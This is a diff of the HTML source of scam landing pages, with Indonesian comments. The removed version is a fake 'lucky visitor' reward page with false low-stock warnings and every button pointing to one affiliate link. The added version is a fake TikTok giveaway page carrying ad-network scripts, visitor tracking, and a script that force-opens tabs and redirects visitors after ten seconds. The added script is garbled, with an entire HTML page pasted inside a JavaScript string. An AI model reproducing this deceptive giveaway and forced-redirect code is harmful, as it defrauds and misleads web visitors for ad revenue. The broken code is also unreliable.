@@ -1,342 +1,526 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
-  <title>CONGRATULATIONS - REWARD PENDING</title>
-  <meta content="You are today's lucky visitor" name="description">
-  
-  <!-- Fonts & Bootstrap -->
-  <link href="https://fonts.gstatic.com" rel="preconnect">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.0/css/bootstrap.min.css" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Giveaways - Claim Now</title>
+    <style>
+        /* Reset CSS dasar */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  <style type="text/css">
-    /* --- CSS RESET & BASE --- */
-    *, *:before, *:after { box-sizing: border-box; }
-    
-    body {
-      margin: 0; padding: 0;
-      font-family: 'Roboto', sans-serif;
-      color: #fff;
-      /* Background Image */
-      background: url("https://images.pond5.com/us-dollar-money-currency-printing-footage-128663063_iconl.jpeg"), radial-gradient(100% 100% at 50% 0%, #00904B 0%, #013D20 100%);
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-position: center;
-      background-attachment: fixed;
-      overflow-x: hidden; /* Mencegah scroll samping */
-    }
-    
-    a { text-decoration: none; color: inherit; }
-    a:hover { text-decoration: none; }
-    
-    /* Agar semua gambar responsive */
-    img {
-      max-width: 100%;
-      height: auto;
-    }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
 
-    /* --- ANIMATION & CARDS --- */
-    .card-container {
-      position: relative;
-      height: 350px; 
-      margin-top: 20px;
-      margin-bottom: 20px;
-    }
-    
-    .creditcard {
-      position: absolute;
-      left: 50%;
-      bottom: 50px;
-      transform: translateX(-50%);
-      height: 180px; 
-      width: auto;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-      border-radius: 10px;
-      animation: cardBounce 8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-    }
-    
-    .card-1 { z-index: 1; animation-delay: 0s; }
-    .card-2 { z-index: 2; animation-delay: 2s; }
-    .card-3 { z-index: 3; animation-delay: 4s; }
-    .card-4 { z-index: 4; animation-delay: 6s; }
+        /* --- LOGIKA BARU UNTUK 2 BANNER KIRI & KANAN --- */
 
-    @keyframes cardBounce {
-      0% { bottom: 50px; opacity: 1; z-index: 5; transform: translateX(-50%) scale(1); }
-      20% { bottom: 50px; opacity: 1; transform: translateX(-50%) scale(1.05); }
-      40% { bottom: -300px; opacity: 0; z-index: 1; } 
-      100% { bottom: 50px; opacity: 0; z-index: 1; }
-    }
+        /* 1. Wrapper untuk menampung 2 iklan sekaligus */
+        .side-wrapper {
+            display: flex;
+            flex-direction: column; /* Iklan disusun ke bawah */
+            gap: 15px; /* Jarak antar iklan atas dan bawah */
+            z-index: 10;
+        }
 
-    /* --- TYPOGRAPHY --- */
-    h1 {
-      font-weight: 700;
-      color: #fff;
-      font-size: 1.8rem;
-      text-align: center;
-      text-shadow: 2px 2px 4px #000;
-      margin-bottom: 20px;
-      line-height: 1.3;
-    }
-    h1 span {
-      display: block;
-      color: #ffe131; 
-      font-size: 1.4rem;
-      font-weight: 300;
-      margin-bottom: 10px;
-    }
-    .intro-text {
-        font-size: 1.1rem; 
-        background: rgba(0,0,0,0.6); 
-        padding: 15px; 
-        border-radius: 10px;
-        margin-bottom: 20px;
-    }
-    .urgent-text {
-      color: #ff4d4d;
-      font-weight: bold;
-      background: rgba(0,0,0,0.7);
-      padding: 3px 6px;
-      border-radius: 4px;
-      white-space: nowrap; /* Teks tidak turun baris */
-    }
+        /* 2. Styling Kotak Iklan Individual */
+        .ad-box {
+            width: 300px;
+            height: 250px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05); /* Sedikit background agar terlihat jika loading */
+            border-radius: 8px;
+        }
 
-    /* --- BUTTONS --- */
-    .btn-wrapper {
-      margin-top: 10px;
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      align-items: center;
-      width: 100%;
-    }
-    .btn-gift {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      width: 100%;
-      max-width: 400px;
-      background: linear-gradient(180deg, #ffe131 0%, #eac200 100%);
-      color: #000;
-      padding: 15px 20px;
-      border-radius: 8px;
-      font-weight: 700;
-      font-size: 1.1rem;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-      border: 2px solid #fff;
-      transition: transform 0.2s;
-    }
-    .btn-gift:hover {
-      transform: scale(1.02);
-      background: linear-gradient(180deg, #fff 0%, #ffe131 100%);
-      cursor: pointer;
-    }
-    .btn-gift img {
-      width: 35px;
-      margin-right: 15px;
-      flex-shrink: 0; /* Mencegah icon gepeng */
-    }
-    .stock-count {
-      background: #ff0000;
-      color: white;
-      font-size: 0.7rem;
-      padding: 3px 8px;
-      border-radius: 20px;
-      text-transform: uppercase;
-      white-space: nowrap;
-    }
-    
-    /* --- UTILITIES --- */
-    .blink { animation: blinker 1s linear infinite; }
-    @keyframes blinker { 50% { opacity: 0.5; } }
-    
-    .container { padding-bottom: 30px; }
-    .header-logo { margin-top: 20px; margin-bottom: 10px; }
-    .ad-wrapper { margin: 15px auto; text-align: center; max-width: 100%; overflow: hidden; }
+        /* 3. Container Utama */
+        .container {
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+            position: relative;
+            z-index: 2;
+        }
 
-    /* --- MOBILE RESPONSIVE TWEAKS --- */
-    @media (max-width: 576px) {
-      /* Perkecil Judul */
-      h1 { font-size: 1.4rem; }
-      h1 span { font-size: 1.1rem; }
-      .intro-text { font-size: 0.95rem; padding: 10px; }
-      
-      /* Perkecil Kartu Animasi */
-      .card-container { height: 280px; }
-      .creditcard { height: 130px; bottom: 30px; }
-      
-      @keyframes cardBounce {
-        0% { bottom: 30px; opacity: 1; z-index: 5; transform: translateX(-50%) scale(1); }
-        20% { bottom: 30px; opacity: 1; transform: translateX(-50%) scale(1.05); }
-        40% { bottom: -200px; opacity: 0; z-index: 1; } 
-        100% { bottom: 30px; opacity: 0; z-index: 1; }
-      }
+        /* TAMPILAN DESKTOP (Layar > 1250px) */
+        /* Kita perlebar sedikit breakpoint agar iklan tidak menabrak konten */
+        @media (min-width: 1251px) {
+            .side-wrapper {
+                position: fixed; /* Melayang tetap */
+                top: 50%;
+                transform: translateY(-50%); /* Tengah vertikal */
+            }
 
-      /* Perkecil Tombol */
-      .btn-gift {
-        padding: 12px 15px;
-        font-size: 0.95rem;
-      }
-      .btn-gift img { width: 28px; margin-right: 10px; }
-      .stock-count { font-size: 0.6rem; }
-    }
-  </style>
+            .left-wrapper {
+                left: 20px;
+            }
+
+            .right-wrapper {
+                right: 20px;
+            }
+        }
+
+        /* TAMPILAN MOBILE & TABLET (Layar <= 1250px) */
+        @media (max-width: 1250px) {
+            body {
+                justify-content: flex-start;
+                gap: 20px;
+                padding-top: 10px;
+            }
+
+            .side-wrapper {
+                position: static; /* Tidak melayang */
+                transform: none;
+                margin: 0 auto;
+                align-items: center;
+            }
+            
+            /* Agar di HP iklan tidak terlalu menumpuk banyak ke bawah, 
+               opsional: kita bisa menyembunyikan iklan ke-2 di HP jika mau.
+               Tapi kode ini akan menampilkan SEMUA. */
+
+            /* Urutan Tampilan di HP */
+            .left-wrapper {
+                order: 1; /* Iklan Kiri (2 biji) di ATAS */
+            }
+            
+            .container {
+                order: 2; /* Konten di TENGAH */
+                margin: 20px 0;
+            }
+
+            .right-wrapper {
+                order: 3; /* Iklan Kanan (2 biji) di BAWAH */
+            }
+        }
+
+        /* Styling Gambar Utama */
+        .image-wrapper {
+            display: block;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(254, 44, 85, 0.3);
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+
+        .image-wrapper:hover {
+            transform: scale(1.02);
+        }
+
+        .image-wrapper img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Styling Tombol */
+        .btn-claim {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 15px 50px;
+            background: linear-gradient(45deg, #FE2C55, #FF0050);
+            color: white;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.5);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulse 2s infinite;
+        }
+
+        .btn-claim:hover {
+            background: linear-gradient(45deg, #d61e42, #e60045);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(254, 44, 85, 0.7);
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        /* Animasi */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(254, 44, 85, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0); }
+        }
+    </style>
 </head>
-
 <body>
 
-  <!-- IKLAN ATAS -->
-  <div class="ad-wrapper">
-    <script>
-      atOptions = {
-        'key' : '5fee7c0df8c16e622489dca8c58825b2',
-        'format' : 'iframe',
-        'height' : 250,
-        'width' : 300,
-        'params' : {}
-      };
-    </script>
-    <script src="https://www.highperformanceformat.com/5fee7c0df8c16e622489dca8c58825b2/invoke.js"></script>
-  </div>
-
-  <div class="text-center header-logo">
-    <!-- Logo Website Utama -->
-    <img src="https://i.imgur.com/keXWpfC.png" style="width:150px; max-width: 50%; height:auto;" alt="Logo">
-  </div>
-
-  <div class="container">
-    <div class="row">
-      <div class="col-12 text-center">
-        <h1>
-          <span class="blink" style="color:#7FFF00;">CONGRATULATIONS!</span>
-          YOU ARE TODAY'S LUCKY VISITOR!
-        </h1>
-        <div class="intro-text">
-          Your device IP has been selected to claim an <b>Exclusive Premium Reward</b>.
-          <br><br>
-          <span class="urgent-text">WARNING: Inventory is Low!</span>
-          <br>
-          Please confirm your device type below to reserve your gift before it is given to the next visitor.
-        </div>
-      </div>    
-    </div>
-
-    <!-- AREA GAMBAR PRODUK LOCAL -->
-    <div class="row">
-      <div class="col-12">
-        <div class="card-container">
-          <!-- Gambar dipanggil langsung dari folder yang sama -->
-          <img class="creditcard card-4" src="produk-4.png" alt="Gift Card 4" /> 
-          <img class="creditcard card-3" src="produk-3.png" alt="Gift Card 3" /> 
-          <img class="creditcard card-2" src="produk-2.png" alt="Gift Card 2" />
-          <img class="creditcard card-1" src="produk-1.png" alt="Gift Card 1" />
-        </div>
-      </div>
-    </div>
-
-    <!-- ACTION BUTTONS -->
-    <div class="row">
-      <div class="col-12 text-center">
-        <h3 style="color:#7FFF00; font-size:1.3rem; margin-bottom:15px;">
-          <span class="blink">STEP 1: CONFIRM YOUR DEVICE</span>
-        </h3>
+    <!-- === GROUP IKLAN KIRI (2 IKLAN) === -->
+    <div class="side-wrapper left-wrapper">
         
-        <div class="btn-wrapper">
-          <a class="btn-gift" href="https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=bz" onclick="clickTrack('iOS')">
-            <div style="display:flex; align-items:center;">
-              <img src="https://i.imgur.com/aQjRp8q.png" alt="iOS">
-              <span>Apple / iOS</span>
-            </div>
-            <div class="stock-count">2 LEFT</div>
-          </a>
-
-          <a class="btn-gift" href="https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=bz" onclick="clickTrack('Android')">
-            <div style="display:flex; align-items:center;">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/512px-Android_robot.svg.png" alt="Android">
-              <span>Android User</span>
-            </div>
-            <div class="stock-count">3 LEFT</div>
-          </a>
-
-          <a class="btn-gift" href="https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=bz" onclick="clickTrack('Windows')">
-            <div style="display:flex; align-items:center;">
-              <img src="https://i2.wp.com/www.pcplus.co.id/wp-content/uploads/2014/06/windows-vista.png" alt="Windows">
-              <span>Windows PC</span>
-            </div>
-            <div class="stock-count">AVAILABLE</div>
-          </a>
+        <!-- IKLAN KIRI 1 (ATAS) -->
+        <div class="ad-box">
+            <script type="text/javascript">
+                atOptions = {
+                    'key' : '5891fb6676c0734c6d972b61908af244',
+                    'format' : 'iframe',
+                    'height' : 250,
+                    'width' : 300,
+                    'params' : {}
+                };
+            </script>
+            <script type="text/javascript" src="//www.highperformanceformat.com/5891fb6676c0734c6d972b61908af244/invoke.js"></script>
         </div>
 
-        <br><hr style="border-top: 1px solid rgba(255,255,255,0.2);"><br>
-
-        <h3 style="font-size:1.1rem; margin-bottom:15px;">Or Select Your Region:</h3>
-        
-        <div class="btn-wrapper">
-          <a class="btn-gift" href="https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=bz" style="background:#222; border-color:#555;">
-            <div style="display:flex; align-items:center;">
-              <img src="https://img1.picmix.com/output/stamp/normal/4/5/9/9/1499954_5828e.gif" alt="USA">
-              <span style="color:#fff;">UNITED STATES</span>
-            </div>
-            <div style="color:#7FFF00; font-size:0.8rem;">OPEN</div>
-          </a>
-
-          <a class="btn-gift" href="https://profita.g2afse.com/sl?id=677e6866fa106c73876df3d8&pid=2346&sub1=bz" style="background:#222; border-color:#555;">
-            <div style="display:flex; align-items:center;">
-              <img src="https://virlenda.unipasby.ac.id/pluginfile.php/56272/course/overviewfiles/Nama%20nama%20Negara%20Di%20Dunia.gif" alt="World">
-              <span style="color:#fff;">OTHER COUNTRIES</span>
-            </div>
-            <div style="color:#7FFF00; font-size:0.8rem;">OPEN</div>
-          </a>
+        <!-- IKLAN KIRI 2 (BAWAH) -->
+        <div class="ad-box">
+            <!-- GANTI SCRIPT DI BAWAH INI DENGAN KODE IKLAN BARU ANDA -->
+            <script type="text/javascript">
+  atOptions = {
+  	'key' : 'cf0107bd107b07f9cb5658dac62642fb',
+  	'format' : 'iframe',
+  	'height' : 250,
+  	'width' : 300,
+  	'params' : {}
+  };
+</script>
+<script
+  type="text/javascript"
+  src="https://www.highperformanceformat.com/cf0107bd107b07f9cb5658dac62642fb/invoke.js"
+></script>
         </div>
 
-      </div>
-    </div>
-    
-    <br><br>
-    
-    <div class="row">
-      <div class="col-12 text-center">
-        <p style="font-size:0.8rem; color:#aaa;">No Purchase Required. Void where prohibited.</p>
-        <img src="https://cdn.shopify.com/s/files/1/0085/0408/2511/files/help-center-payment-icons_d2a60cde-7989-4216-8d23-d678f172ace3.png?v=1629336746" style="width:250px; max-width:80%; opacity:0.8;" alt="Secure">
-      </div>
     </div>
 
-  </div>
+    <!-- === KONTEN UTAMA (TENGAH) === -->
+    <div class="container">
+        <!-- Gambar Utama -->
+        <a href="http://laststep-us-now.netlify.app/?s1=bzone" class="image-wrapper">
+            <img src="banner.png" alt="TikTok Giveaway Event">
+        </a>
 
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-  <script type="text/javascript">
-    function clickTrack(device) {
-      console.log("User selected: " + device);
-    }
-  </script>
-  
-  <!-- IKLAN BAWAH -->
-  <div class="ad-wrapper">
+        <!-- Tombol Claim Now -->
+        <a href="http://laststep-us-now.netlify.app/?s1=bzone" class="btn-claim">
+            Next
+        </a>
+
+        <div class="footer">
+            &copy; 2025 Giveaway Event. All rights reserved.
+        </div>
+    </div>
+
+    <!-- === GROUP IKLAN KANAN (2 IKLAN) === -->
+    <div class="side-wrapper right-wrapper">
+
+        <!-- IKLAN KANAN 1 (ATAS) -->
+        <div class="ad-box">
+            <script type="text/javascript">
+                atOptions = {
+                    'key' : '5fee7c0df8c16e622489dca8c58825b2',
+                    'format' : 'iframe',
+                    'height' : 250,
+                    'width' : 300,
+                    'params' : {}
+                };
+            </script>
+            <script type="text/javascript" src="//www.highperformanceformat.com/5fee7c0df8c16e622489dca8c58825b2/invoke.js"></script>
+        </div>
+
+        <!-- IKLAN KANAN 2 (BAWAH) -->
+        <div class="ad-box">
+            <!-- GANTI SCRIPT DI BAWAH INI DENGAN KODE IKLAN BARU ANDA -->
+             <script type="text/javascript">
+  atOptions = {
+  	'key' : 'cf0107bd107b07f9cb5658dac62642fb',
+  	'format' : 'iframe',
+  	'height' : 250,
+  	'width' : 300,
+  	'params' : {}
+  };
+</script>
+<script
+  type="text/javascript"
+  src="https://www.highperformanceformat.com/cf0107bd107b07f9cb5658dac62642fb/invoke.js"
+></script>
+        </div>
+
+    </div>
+	
+	<!-- === SCRIPT AUTOLOAD DIRECT LINK  === -->
     <script>
-      atOptions = {
-        'key' : '5fee7c0df8c16e622489dca8c58825b2',
-        'format' : 'iframe',
-        'height' : 250,
-        'width' : 300,
-        'params' : {}
-      };
-    </script>
-    <script src="https://www.highperformanceformat.com/5fee7c0df8c16e622489dca8c58825b2/invoke.js"></script>
-  <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
-<script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,4884516,4,24,200,50,00011111']);
-_Hasync.push(['Histats.fasi', '1']);
-_Hasync.push(['Histats.track_hits', '']);
-(function() {
-var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-hs.src = ('//s10.histats.com/js15_as.js');
-(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-})();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4884516&101" alt="web stats" border="0"></a></noscript>
-<!-- Histats.com  END  -->
-  </div>
+        const myLinks = [
+            "<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Giveaways - Claim Now</title>
+    <style>
+        /* Reset CSS dasar */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* --- LOGIKA BARU UNTUK 2 BANNER KIRI & KANAN --- */
+
+        /* 1. Wrapper untuk menampung 2 iklan sekaligus */
+        .side-wrapper {
+            display: flex;
+            flex-direction: column; /* Iklan disusun ke bawah */
+            gap: 15px; /* Jarak antar iklan atas dan bawah */
+            z-index: 10;
+        }
+
+        /* 2. Styling Kotak Iklan Individual */
+        .ad-box {
+            width: 300px;
+            height: 250px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05); /* Sedikit background agar terlihat jika loading */
+            border-radius: 8px;
+        }
+
+        /* 3. Container Utama */
+        .container {
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* TAMPILAN DESKTOP (Layar > 1250px) */
+        /* Kita perlebar sedikit breakpoint agar iklan tidak menabrak konten */
+        @media (min-width: 1251px) {
+            .side-wrapper {
+                position: fixed; /* Melayang tetap */
+                top: 50%;
+                transform: translateY(-50%); /* Tengah vertikal */
+            }
+
+            .left-wrapper {
+                left: 20px;
+            }
+
+            .right-wrapper {
+                right: 20px;
+            }
+        }
+
+        /* TAMPILAN MOBILE & TABLET (Layar <= 1250px) */
+        @media (max-width: 1250px) {
+            body {
+                justify-content: flex-start;
+                gap: 20px;
+                padding-top: 10px;
+            }
+
+            .side-wrapper {
+                position: static; /* Tidak melayang */
+                transform: none;
+                margin: 0 auto;
+                align-items: center;
+            }
+            
+            /* Agar di HP iklan tidak terlalu menumpuk banyak ke bawah, 
+               opsional: kita bisa menyembunyikan iklan ke-2 di HP jika mau.
+               Tapi kode ini akan menampilkan SEMUA. */
+
+            /* Urutan Tampilan di HP */
+            .left-wrapper {
+                order: 1; /* Iklan Kiri (2 biji) di ATAS */
+            }
+            
+            .container {
+                order: 2; /* Konten di TENGAH */
+                margin: 20px 0;
+            }
+
+            .right-wrapper {
+                order: 3; /* Iklan Kanan (2 biji) di BAWAH */
+            }
+        }
+
+        /* Styling Gambar Utama */
+        .image-wrapper {
+            display: block;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(254, 44, 85, 0.3);
+            transition: transform 0.3s ease;
+            cursor: pointer;
+        }
+
+        .image-wrapper:hover {
+            transform: scale(1.02);
+        }
+
+        .image-wrapper img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Styling Tombol */
+        .btn-claim {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 15px 50px;
+            background: linear-gradient(45deg, #FE2C55, #FF0050);
+            color: white;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.5);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulse 2s infinite;
+        }
+
+        .btn-claim:hover {
+            background: linear-gradient(45deg, #d61e42, #e60045);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(254, 44, 85, 0.7);
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        /* Animasi */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(254, 44, 85, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0); }
+        }
+    </style>
+</head>
+<body>
+
+   
+
+    <!-- === KONTEN UTAMA (TENGAH) === -->
+    <div class="container">
+        <!-- Gambar Utama -->
+        <a href="http://laststep-us-now.netlify.app/?s1=bzone" class="image-wrapper">
+            <img src="banner.png" alt="TikTok Giveaway Event">
+        </a>
+
+        <!-- Tombol Claim Now -->
+        <a href="http://laststep-us-now.netlify.app/?s1=bzone" class="btn-claim">
+            Next
+        </a>
+
+        <div class="footer">
+            &copy; 2025 Giveaway Event. All rights reserved.
+        </div>
+    </div>
+ 
+	
+	<!-- === SCRIPT AUTOLOAD DIRECT LINK  === -->
+    <script>
+        const myLinks = [
+            "http://laststep-us-now.netlify.app/?s1=bzone", 
+            "http://laststep-us-now.netlify.app/?s1=bzone"
+        ];
+ 
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                myLinks.forEach(function(link) {
+                    window.open(link, '_blank'); 
+                });
+                  window.location.href = myLinks[0]; 
+
+            }, 10000); 
+        });
+    </script> 
+    
+    <center>
+        <div id="histats_counter"></div>
+        <script type="text/javascript">var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,4884516,4,24,200,50,00011111']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();</script>
+        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4884516&101" alt="free geoip" border="0"></a></noscript>
+    </center>
+</body>
+</html>", 
+            "https://www.effectivegatecpm.com/w4deur4mzh?key=f9741a58a274f0182a88f1ff37734bd9"
+        ];
+ 
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                myLinks.forEach(function(link) {
+                    window.open(link, '_blank'); 
+                });
+                  window.location.href = myLinks[0]; 
+
+            }, 10000); 
+        });
+    </script> 
+    
+    <center>
+        <div id="histats_counter"></div>
+        <script type="text/javascript">var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,4884516,4,24,200,50,00011111']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();</script>
+        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4884516&101" alt="free geoip" border="0"></a></noscript>
+    </center>
 </body>
 </html>
